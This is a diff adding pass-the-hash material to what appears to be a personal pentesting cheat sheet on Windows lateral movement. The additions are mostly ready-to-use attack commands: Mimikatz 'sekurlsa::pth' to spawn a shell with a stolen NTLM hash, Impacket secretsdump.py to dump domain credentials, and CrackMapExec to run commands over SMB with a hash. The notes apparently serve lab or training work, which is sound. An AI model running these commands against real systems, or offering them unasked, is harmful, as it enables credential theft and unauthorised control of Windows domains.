@@ -66,19 +66,40 @@ Attempt to RDP. Simple!
 ### RDP Session Hijack
 
 ### Pass The Hash
+
 #### Mimilatz
 
+The command should spawn a new cmd.exe process with the credentials of the user we’re trying to impersonate.
+`privilege::debug`
 `sekurlsa::pth /user:jeff /domain:hackerlab.com /ntlm:HASH /run:cmd.exe`
+
+Pass the has without starting a session
+
+`sekurlsa::pth /user:jeff /domain:hackerlab.com /ntlm:HASH`
 
 Verify. check if you can run commands on DC
 
 `PsExec.exe \\<IP of DC> cmd.exe`
 
 #### Impacket
-#### XFreeRDP
+
+`secretsdump.py -hashes LM:NTLM ./Administrator@<ip>`
+
+Examples
+
+```
+secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
+secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
+secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
+```
+
 #### CrackMapExec 
 
+`crackmapexec smb <ip> -u <username> -H <hash> -x <command>`
 
+Examples
+
+`crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig`
 
 reference the cheatsheet
 
@@ -87,5 +108,6 @@ reference the cheatsheet
 **Windows Lateral Movement** 
 
 - Lateral Movement Article https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
+- Pass the hash article https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
 - Pass the hash with Mimikatz https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/
 
